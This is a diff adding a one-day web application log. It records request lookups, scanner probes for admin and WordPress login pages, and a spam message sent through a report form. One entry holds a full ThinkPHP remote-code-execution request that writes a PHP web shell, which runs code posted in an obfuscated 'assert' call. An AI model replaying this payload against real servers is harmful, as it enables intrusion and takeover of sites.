@@ -1,0 +1,27 @@
+2019-07-08 0:55:19 - INFO --> getUserByCookie: 
+2019-07-08 0:55:19 - INFO --> getZoomById: admin/images/cal_date_over.gif
+2019-07-08 0:55:27 - INFO --> getUserByCookie: 
+2019-07-08 0:55:27 - INFO --> getZoomById: admin/login.php
+2019-07-08 0:55:28 - INFO --> getUserByCookie: 
+2019-07-08 0:55:28 - INFO --> getZoomById: templates/system/css/system.css
+2019-07-08 0:55:33 - INFO --> getUserByCookie: 
+2019-07-08 0:55:33 - INFO --> getZoomById: wp-login.php
+2019-07-08 4:09:59 - INFO --> getUserByCookie: 
+2019-07-08 4:09:59 - INFO --> getZoomById: mbahKb
+2019-07-08 4:09:59 - INFO --> incrementZoomById: mbahKb
+2019-07-08 4:09:59 - INFO --> increment zoom: mbahKb
+2019-07-08 7:30:19 - INFO --> getUserByCookie: 
+2019-07-08 7:30:19 - INFO --> getZoomById: mbahKb
+2019-07-08 7:30:19 - INFO --> incrementZoomById: mbahKb
+2019-07-08 7:30:19 - INFO --> increment zoom: mbahKb
+2019-07-08 12:06:01 - INFO --> getUserByCookie: 
+2019-07-08 12:06:01 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=neuwvcjxkxc.php&vars%5B1%5D%5B%5D=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bqazw%5D);?%3E
+2019-07-08 16:54:55 - INFO --> getUserByCookie: 
+2019-07-08 16:54:57 - INFO --> getUserByCookie: 
+2019-07-08 16:54:57 - INFO --> getZoomById: reportType=Legal+Issue&email=ruby5643hug%40gmail.com&description=Would+you+be+interested+in+an+advertising+service+that+costs+less+than+%2450+monthly+and+delivers+tons+of+people+who+are+ready+to+buy+directly+to+your+website%3F+Reply+now+and+I%27ll+send+more+details.%0D%0A
+2019-07-08 17:47:32 - INFO --> getUserByCookie: 
+2019-07-08 17:47:32 - INFO --> getZoomById: forum.php
+2019-07-08 17:47:35 - INFO --> getUserByCookie: 
+2019-07-08 17:47:35 - INFO --> getZoomById: bbs/forum.php
+2019-07-08 22:47:59 - INFO --> getUserByCookie: 
+2019-07-08 22:47:59 - INFO --> getZoomById: sitemap.xml
